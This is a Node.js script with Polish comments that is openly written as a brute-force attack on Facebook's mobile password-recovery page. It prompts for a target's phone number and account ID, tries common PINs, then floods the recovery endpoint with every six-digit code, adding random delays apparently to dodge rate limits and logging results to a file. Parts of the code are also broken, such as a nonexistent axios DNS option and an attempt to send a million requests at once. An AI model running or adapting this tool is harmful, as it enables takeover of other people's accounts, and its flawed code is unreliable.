const readlineSync = require('readline-sync');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');

// Ustawienie serwera DNS na 1.1.1.1
axios.defaults.dns = '1.1.1.1';

const słownik = ["1234", "0000", "1111", "4321", "5555", "9999", "12345678", "87654321"];

// Funkcja do generowania kodów
async function generateCode() {
    const number = crypto.randomInt(100000, 1000000);
    const code = number.toString();
    return code;
}

// Funkcja do sprawdzania ważności partii kodów
async function checkBatchValidity(codes) {
    const targetUrl = "https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_1q6Vogj2mr2kpMQG9&_rdr";
    const requests = codes.map(code => axios.post(targetUrl, { code }));
    const responses = await Promise.all(requests);
    
    for (let i = 0; i < responses.length; i++) {
        const response = responses[i];
        const code = codes[i];
        if (response.data.valid) {
            return code;
        }
    }
    return null;
}

// Funkcja do ataku bruteforce
async function bruteForce(charset, length) {
    var result = [];
    var charsLength = charset.length;
    for (var i = 0; i < Math.pow(charsLength, length); i++) {
        var s = '';
        var temp = i;
        for (var j = 0; j < length; j++) {
            s = charset[temp % charsLength] + s;
            temp = Math.floor(temp / charsLength);
        }
        result.push(s);
    }
    return result;
}

// Funkcja ataku bruteforce z zastosowaniem sugestii
async function bruteForceCode() {
    const targetInfo = readlineSync.question("Wpisz numer telefonu celu i identyfikator konta oddzielone przecinkiem: ");
    let validCode;

    // Najpierw wypróbuj kody ze słownika
    validCode = await checkBatchValidity(słownik);
    if (validCode) {
        return validCode;
    }

    const maxAttempts = 100;
    const maxDuration = 60 * 1000; // 60 sekund w milisekundach
    const minDelay = 1000; // 1 sekunda w milisekundach
    const maxDelay = 5000; // 5 sekund w milisekundach
    let próby = 0;
    const startTime = Date.now();

    while (true) {
        próby++;

        if (próby > maxAttempts || Date.now() - startTime > maxDuration) {
            break;
        }

        const codes = await bruteForce('0123456789', 6);
        validCode = await checkBatchValidity(codes);
        if (validCode) {
            return validCode;
        }

        console.log(`Wygenerowane kody: ${codes.join(", ")}`);
        console.log(`Żaden z nich nie jest prawidłowy.`);

        fs.appendFile("results.txt", `Wygenerowane kody: ${codes.join(", ")}\nŻaden z nich nie jest prawidłowy.\n`, (err) => {
            if (err) throw err;
        });

        // Dodaj opóźnienie między próbami
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
    }

    return null;
}

try {
    bruteForceCode().then(validCode => {
        console.log(`Prawidłowy kod na podanej stronie to: ${validCode}`);
        fs.appendFile("results.txt", `Prawidłowy kod na podanej stronie to: ${validCode}\n`, (err) => {
            if (err) throw err;
        });
    });
} catch (error) {
    console.error(`Błąd: ${error.message}`);
}
